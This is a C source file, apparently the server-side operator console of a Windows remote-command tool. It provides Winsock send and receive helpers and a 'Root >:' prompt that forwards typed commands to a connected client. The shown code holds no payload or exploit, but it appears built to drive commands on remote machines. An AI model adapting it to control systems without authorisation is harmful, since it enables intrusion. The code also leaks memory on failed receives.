#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include "net/commands.h"
#include "net/interface.h"
#include "logger.h"
#include "server.h"
#include "types.h"

int net_SendData(SOCKET sock, char* msg, int len)
{
     int rv = send(sock, msg, len, 0);
     NET_PROTECT_CPU();

     if(rv < 1)
     {
          return 0;
     }

     return rv;
}

int net_ReciveData(SOCKET sock, OUT_STRP msg)
{
     char *rbuff = malloc(NET_BUFFSIZE);
     memset(rbuff, 0, NET_BUFFSIZE);
     int rv = recv(sock, rbuff, NET_BUFFSIZE, 0);
     NET_PROTECT_CPU();

     if(rv < 1)
     {
          return 0;
     }

     *msg = rbuff;

     return rv;
}

int net_checkConnection(SOCKET sock)
{
     return send(sock, "\x0", 1, 0);
}

int net_Execute(SOCKET sock)
{
     if(sock == INVALID_SOCKET)
     {
          return -1;
     }

     if(net_checkConnection(sock) < 1)
     {
          LOG(LOG_ERR, "Изгуби или прекрати връзка със нас!\n");
          serv_CloseConnection();

          return -2;
     }

     char itext[NET_BUFFSIZE];
     fflush(stdin);
     if(log_PS)
     {
          printf("\n\x1b[36mRoot \x1b[0;37m>\x1b[40m:\x1b[0;37m");
     }else{
          printf("Root >:");
     }
     fgets(itext, NET_BUFFSIZE, stdin);
     int itextLen = strlen(itext) - 1;
     itext[itextLen] = '\0';
     char msg[NET_BUFFSIZE];
	puts("");
	
	if(net_ExecuteCmd(itext, itextLen, sock) < 1)
	{
		serv_CloseConnection();

		return -3;
	}

     return 1;
}